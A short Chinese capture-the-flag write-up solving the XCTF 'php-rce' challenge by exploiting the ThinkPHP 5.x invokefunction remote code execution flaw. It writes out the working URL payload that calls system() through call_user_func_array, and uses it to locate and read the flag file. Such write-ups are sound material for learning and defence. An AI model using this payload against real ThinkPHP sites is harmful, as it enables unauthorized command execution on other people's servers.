# 攻防世界 web php-rce

![image-20211111232407058](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111232407058.png)

打开环境看到如下界面

![image-20211111232427486](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111232427486.png)

可以看出这个页面使用了thinkphp v5框架，不管有什么先看看框架本身有没有可以利用的漏洞

![image-20211111232548373](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111232548373.png)

很好 随手一搜就是个漏洞，涉及到远程代码执行

点开看看

![image-20211111232638806](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111232638806.png)

受影响的版本如上所示

让它报一下错看看能不能看见具体版本

payload1

`/index.php?s=1`

![image-20211111232809767](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111232809767.png)

那它确实是一个受影响的版本

看一下有没有poc

![image-20211111232913384](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111232913384.png)

那它确实是有现成的poc

提炼一下信息，poc格式如下：

poc:

`index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=你要执行的命令`

既然是要看flag，那就找一下flag 

payload2：

`index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name 'flag'`

![image-20211111233351482](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111233351482.png)

好的 cat一下结束

payload3:

`index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`

![image-20211111233509715](C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20211111233509715.png)

漏洞利用详解：[Thinkphp5-x远程代码执行 漏洞分析 - FreeBuf网络安全行业门户](https://www.freebuf.com/column/211319.html)



一些其它解：[【XCTF 攻防世界】WEB 高手进阶区 Web_php_include_Kal1的博客-CSDN博客](https://blog.csdn.net/weixin_45844670/article/details/108180309)



